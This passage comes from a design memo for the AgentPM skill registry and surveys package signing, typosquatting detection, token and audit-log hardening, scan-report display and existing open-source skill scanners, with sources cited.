- This protects against tampered storage, mirrors, CDNs and MITM. It does not protect against a fully compromised server that holds the key.

**(b) Publisher signatures. Optional layer.**
- The author's Ed25519 public key is registered on the account.
- `agentpm push` signs the versionDigest, the server verifies it, and the client can pin publisher keys per skill.
- This survives a registry compromise or token theft, provided the key is stored separately.
- The cost is key distribution, rotation and recovery UX.

**(c) minisign compatibility.**
- The format is a base64 blob of `alg || key_id(8 bytes) || ed25519 sig`.
- The prehashed `ED` variant signs BLAKE2b-512 of the file, and a trusted comment is covered by a global signature.
- This is implementable with node:crypto alone. I have not verified that `blake2b512` is available in every Node 24 build.
- The benefit is that users can verify with the stock `minisign` binary.

**(d) Sigstore or cosign keyless.**
- Ephemeral key, Fulcio certificate bound to an OIDC identity (GitHub, Google or Microsoft), Rekor transparency log entry.
- Verification needs the expected identity and issuer. It needs network access at signing time.
- Offline verification works only with a bundle, plus a TUF-distributed trust root.
- `sigstore-js` (Apache-2.0, TypeScript, active) exists but pulls a sizeable dependency tree.
- A private Fulcio and Rekor deployment is unrealistic for a small project.
- It is sensible only as a verifier for skills sourced from GitHub releases or attestations (immutable releases emit Sigstore bundles).

**(e) npm provenance and trusted publishing.**
- Trusted publishing went GA on 31 July 2025. It uses OIDC from GitHub Actions or GitLab CI hosted runners and needs npm 11.5.1 or later. Provenance is generated automatically.
- npm states provenance "does not guarantee the package has no malicious code".
- For the registry this is a concept for much later. For AgentPM's own `@travelhawk/agentpm` npm package it is essentially free.

**(f) SLSA.**
- A framework about build provenance. Skills are not built, so it adds little beyond source-repo and commit attestation.

**(g) TUF (`tuf-js`, MIT).**
- Defends against rollback, indefinite freeze, mix-and-match and key compromise.
- Needs four roles, thresholds, expiring metadata and periodic re-signing.
- A cheap approximation is a signed index carrying `indexVersion` (monotonic; the client rejects anything lower than the last seen) and `expires`.

**(h) NVIDIA Verified Skills.**
- Ships a detached `skill.oms.sig` after scan and evaluation. This shows the pattern "sign after scan, verify after install" is already in use for skills.
- I did not verify the exact signature format.
Sources: https://nodejs.org/api/crypto.html ; https://docs.npmjs.com/about-registry-signatures ; https://jedisct1.github.io/minisign/ ; https://docs.sigstore.dev/cosign/signing/overview/ ; https://docs.sigstore.dev/cosign/signing/signing_with_blobs/ ; https://github.com/sigstore/sigstore-js ; https://github.blog/changelog/2025-07-31-npm-trusted-publishing-with-oidc-is-generally-available/ ; https://docs.npmjs.com/generating-provenance-statements ; https://theupdateframework.io/docs/security/ ; https://github.com/theupdateframework/tuf-js ; https://docs.nvidia.com/skills/

### Typosquatting and name-confusion detection is deterministic and cheap [high]
**What registries do**
- npm (since 2017): strips punctuation and blocks a new name if it equals an existing one. `react-native` blocks `reactnative`, `react_native` and `react.native`. npm recommends scopes.
- PyPI: uses "ultranormalization" and rejects with "The name 'l10n' is too similar to an existing project". Examples in the warehouse issue show 1, l and i treated as equivalent. I did not confirm the exact mapping table. The same issue notes this lets one registration squat many variants.
- crates.io: runs `typomania` (Rust Foundation) as a background job on every new crate publish.
  - Checks: Bitflips, Omitted, Repeated, SwappedCharacters, SwappedWords, Typos, Version.
  - Matches notify admins; they do not block.
  - It caught four malicious crates at publish time in about 18 months.

**Background**
- Andrew Nesbitt's December 2025 survey lists 13 generation techniques: omission, repetition, transposition, replacement, addition, homoglyph, delimiter, word order, plural, combosquatting, vowel swap, bitsquatting and adjacent insertion.
- He notes edit distance alone misses homoglyph and keyboard-adjacent cases. 18 of 40 historical typosquats had Levenshtein distance of 2 or less.
- OpenSSF principles list typosquatting protection at level 1.

**For AgentPM**
- Names are already ASCII-only, so no Unicode confusables table (TR39) is needed for names. It is still needed for file content and paths.
- On first publish of a new name, compute a skeleton: lowercase, strip `._-`, then map `0→o`, `1/i/l→l`, `rn→m`, `vv→w`, `5→s`. Reject if the skeleton equals one owned by another user.
- Flag Damerau-Levenshtein distance of 1, or 2 for names of eight or more characters, against existing names owned by others. Flag swapped words and plural or combo suffixes (`-js`, `-skill`, `-official`, `-mcp`). A flag means quarantine for admin approval.
- Keep a reserved list (`anthropic`, `claude`, `openai`, `codex`, `agentpm`, `official`, and so on).
- Same-owner names are exempt.
- A self-hosted registry has at most thousands of names, so an O(n) scan per publish is trivial.
- Longer term, `@owner/name` namespaces remove most of this problem.
Sources: https://blog.npmjs.org/post/168978377570/new-package-moniker-rules ; https://github.com/pypi/warehouse/issues/11139 ; https://alpha-omega.dev/blog/package-typosquatting-detection-in-rustdusttrustrut/ ; https://docs.rs/typomania/latest/typomania/checks/index.html ; https://nesbitt.io/2025/12/17/typosquatting-in-package-managers.html ; https://repos.openssf.org/principles-for-package-repository-security

### Accounts, tokens, 2FA and audit log: current state versus the baseline [high]
**Current state in the code**
- Tokens are stored as sha256 hashes (`auth.ts:41`), which is good.
- The `tokens` table (`db.ts:137-145`) has only `label`, `created_at`, `last_used_at` and `revoked`. It has no scope, no expiry and no per-skill restriction.
- Roles are `admin`, `publisher` and `reader`. A login rate limiter exists.
- There is no MFA.
- There is no audit or event table. `published_by` on a version is the only trace. Deletes leave no record.

**Baseline**
- OpenSSF Principles for Package Repository Security:
  - Level 1: MFA (TOTP minimum), brute-force prevention, API keys scoped to specific packages, token prefixes for secret scanning, typosquatting protection.
  - Level 2: RBAC, versions that cannot be replaced, a user reporting mechanism, malware scanning.
  - Level 3: short-lived OIDC tokens, provenance, an "event transparency log".
- npm permanently revoked all classic tokens on 9 December 2025. Granular tokens now default to 2FA and have a 90-day maximum lifetime (per search summaries). The driver was repeated token-theft worms and CI compromises.

**Recommended minimum**
- Token scopes `read`, `publish` and `admin`, plus an optional skill-name allowlist.
- An `expires_at`, defaulting to 90 days. A CI token should be publish-only for named skills.
- A recognizable token prefix such as `agentpm_`, so secret scanners can find leaks.
- An append-only, hash-chained `audit_events` table:
  - Columns: `ts, actor, token_id, ip, action, target, digest, outcome, prev_hash`.
  - Actions covered: login, token mint and revoke, publish, yank, quarantine and release, ownership transfer, user changes, and failed publishes with scan verdicts.
  - Expose it via an admin endpoint and as a per-skill public history.
- TOTP for password login (RFC 6238 can be implemented with node:crypto HMAC) is a nice-to-have for a small team registry. Treat it as a must if the registry is internet-facing with multiple publishers.
Sources: D:\DevProjects\private\agentpm\packages\registry-server\src\db.ts ; D:\DevProjects\private\agentpm\packages\registry-server\src\auth.ts ; https://repos.openssf.org/principles-for-package-repository-security ; https://socket.dev/blog/npm-revokes-classic-tokens

### Store the scan report with the version and show it in the UI and in `agentpm install` [medium]
**Precedents**
- skills.sh shows per-skill audit results publicly. Its CLI (1.4.0 and later) prints audit results and risk levels before installation, and flagged skills show a warning.
- Smithery shows mcp-scan findings on the registry page.
- ClawHub maps verdicts to approve, warn or block.
- VS Code keeps a block list that the client enforces after install.

**Design for AgentPM, all deterministic**

1. One scanner package, for example `packages/security`, is used in three places: the client pre-push, the server in the PUT handler, and the client pre-link. It emits a report with:
   - `scannerVersion`, `rulesetDigest`, `inputDigest` (the versionDigest), `verdict: pass|warn|block|error`;
   - `findings[]`, each with rule id, severity, file, line and excerpt hash;
   - `externalReferences[]`, each with url, git ref or package spec, plus `pinned: bool`;
   - `fileManifest[]`, each with path, sha256, size and type.
2. The server stores the report next to the archive, keyed by digest. It puts `scanReportDigest` and the verdict in the version metadata and in the index. If a registry signature exists, it covers both.
3. `GET /v1/skills/:name` and the web UI show:
   - a status badge (`active`, `quarantined` or `yanked`);
   - the verdict and findings;
   - the external-reference list;
   - the file list with hashes;
   - the publisher;
   - the version event history.
4. `agentpm install`, `update` and `sync` behave as follows:
   - Verify the digest.
   - Re-run the local scan. The client must not trust the server's report, but it shows both and flags disagreement or an older ruleset.
   - Print a compact summary.
   - `block`, `quarantined`, a digest mismatch or `error` aborts with no override, except an explicit `--allow-risk <rule-id>` recorded in `agentpm.yaml`.
   - `warn` requires confirmation or `--yes`. This fits the existing "destructive/risky actions require explicit confirmation" convention.
   - On update, show the delta: new findings, new external refs, new executable files.
5. `agentpm audit` or `doctor`:
   - re-hash installed trees against recorded digests, which detects local tampering of the cache that the symlinks point into;
   - query the registry for yanked or quarantined status of installed versions, as the kill-switch analogue;
   - rescan with the current ruleset.
Sources: https://vercel.com/changelog/automated-security-audits-now-available-for-skills-sh ; https://invariantlabs.ai/blog/smithery-mcp-scan ; https://openclaw.ai/blog/virustotal-partnership ; https://code.visualstudio.com/docs/configure/extensions/extension-runtime-security ; D:\DevProjects\private\agentpm\packages\core\src\service.ts

### Existing open-source scanners are mostly Python and LLM-assisted; use them as rule inspiration and test corpora, not as the gate [medium]
- **cisco-ai-defense/skill-scanner** (about 2.5k stars, Python, Apache-2.0 per README badge, pushed 2026-09-05).
  - Combines YAML and YARA-X signatures, AST and dataflow analysis, an optional LLM judge and a CEL decision layer.
  - Outputs SARIF, and ships a pre-commit hook and a GitHub Action.
  - The static layers are deterministic, and the rule packs are a good source of rule ideas.
  - It needs a Python runtime, so it does not fit the pure Node/TS and offline requirement for the core gate.
- **NVIDIA/SkillSpector** (about 17.7k stars, Python, Apache-2.0, pushed 2026-09-18).
  - 71 patterns in 17 categories.
  - `--no-llm` gives static-only mode.
  - Documents fail-closed resource bounds.
  - Supports baseline suppression by fingerprint.
  - Part of a scan, evaluate and sign pipeline.
- **snyk/agent-scan** (about 3.1k stars, Apache-2.0).
  - Requires `SNYK_TOKEN` and a cloud analysis API.
  - Its README warns the CLI output is experimental.
  - Scanning MCP configs executes the configured server commands.
  - Not suitable as a deterministic offline gate.
- **trailofbits/overtly-malicious-skills.** Four bypass skills. Use them as CI fixtures for the AgentPM scanner. No license file is listed; treat it as reference-only and do not vendor it.
- **Smaller deterministic, zero-dependency scanners** exist: `kriskimmerle/skillsafe`, `syedabbast/skill-scanner`, `aaa-mvc/aga` "rule-first". They are low-star and I did not inspect them in depth.

In all cases, external scanners can be wired in as optional, non-gating annotations on the registry, such as a VirusTotal hash lookup or Cisco static mode. Because they are non-deterministic or need network access, they must never decide pass or fail for the reproducible gate.
Sources: https://github.com/cisco-ai-defense/skill-scanner ; https://github.com/NVIDIA/SkillSpector ; https://github.com/snyk/agent-scan ; https://github.com/trailofbits/overtly-malicious-skills ; https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/